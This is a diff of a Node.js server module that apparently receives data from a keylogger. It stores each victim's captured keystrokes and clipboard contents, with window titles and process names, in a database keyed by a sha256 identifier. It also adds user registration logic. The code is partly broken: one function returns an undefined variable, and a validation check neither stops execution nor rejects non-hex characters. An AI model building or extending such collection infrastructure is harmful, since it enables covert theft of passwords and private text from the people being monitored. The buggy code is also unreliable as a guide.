@@ -44,16 +44,20 @@ function resolveKeyCodes(keyCodes) {
     return text;
 }
 
-function saveKeyboard(uid, data) {
+function saveKeyboard(user_id, data) {
     for (var i = 0; i < data.length; i++) {
 
-        var process	= db.escape(data[i].wndInfo.process);
-        var title	= db.escape(data[i].wndInfo.title);
-        var text    = db.escape(resolveKeyCodes(data[i].keys));
+        var process	= data[i].wndInfo.process;
+        var title	= data[i].wndInfo.title;
+        var text    = resolveKeyCodes(data[i].keys);
         var time	= data[i].wndInfo.time;
 
-        var query = 'INSERT INTO keyboard (uid, process, title, text, event_time) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))';
-        var values = [uid, process, title, text, time];
+        if (text.length == 0) {
+            text = null;
+        }
+
+        var query = 'INSERT INTO keyboard (user_id, process, title, text, event_time) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))';
+        var values = [user_id, process, title, text, time];
 
         db.query(query, values, function(err, rows, fields) {
             if (err) {
@@ -63,16 +67,20 @@ function saveKeyboard(uid, data) {
     }
 }
 
-function saveClipboard(uid, data) {
+function saveClipboard(user_id, data) {
     for (var i = 0; i < data.length; i++) {
 
-        var process	= db.escape(data[i].wndInfo.process);
-        var title	= db.escape(data[i].wndInfo.title);
-        var text    = db.escape(data[i].keys);
+        var process	= data[i].wndInfo.process;
+        var title	= data[i].wndInfo.title;
+        var text    = data[i].data;
         var time	= data[i].wndInfo.time;
 
-        var query = 'INSERT INTO clipboard (uid, process, title, text, event_time) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))';
-        var values = [uid, process, title, text, time];
+        if (text == '') {
+            continue;
+        }
+
+        var query = 'INSERT INTO clipboard (user_id, process, title, text, event_time) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))';
+        var values = [user_id, process, title, text, time];
 
         db.query(query, values, function(err, rows, fields) {
             if (err) {
@@ -82,17 +90,71 @@ function saveClipboard(uid, data) {
     }
 }
 
-function saveData(uid, data) {
+function saveData(user_id, data) {
     switch (data.type) {
         // Keyboard
         case 1:
-        saveKeyboard(uid, data.data.items);
+        saveKeyboard(user_id, data.data.items);
         break;
         // Clipboard
         case 2:
-        saveClipboard(uid, data.data.items);
+        saveClipboard(user_id, data.data.items);
         break;
     }
 }
 
+function validateSHA256(sha256) {
+    if (sha256.length != 64) {
+        return false;
+    }
+
+    for (var i = 0; i < sha256.length; i++) {
+        var code = sha256.charCodeAt(i);
+        if (code < 48 || code > 102) {
+            return false;
+        }
+    }
+
+    return true;
+}
+
+// Add user to database. Returns user id.
+function addUser(sha256, callback) {
+    var query = 'INSERT INTO users (sha256) VALUES (?)';
+    var values = [sha256];
+
+    db.query(query, values, function(err, rows, fields) {
+        if (err) {
+            callback(-1);
+            return;
+        } else {
+            callback(rows.insertId, sha256);
+        }
+    });
+
+    return id;
+}
+
+// Returns user ID by sha256
+function getUserID(sha256, callback) {
+    var uidIsOk = validateSHA256(sha256);
+    if (!uidIsOk) {
+        callback(-1);
+    }
+
+    // Find user with given UID
+    db.query('SELECT * FROM users WHERE sha256 = ?', [sha256], function(err, rows, fields) {
+        if (err) {
+            callback(-1);
+        } else {
+            if (rows.length == 0) {
+                addUser(sha256, callback);
+            } else {
+                callback(rows[0].id, sha256);
+            }
+        }
+    });
+}
+
 module.exports.saveData = saveData;
+module.exports.getUserID = getUserID;
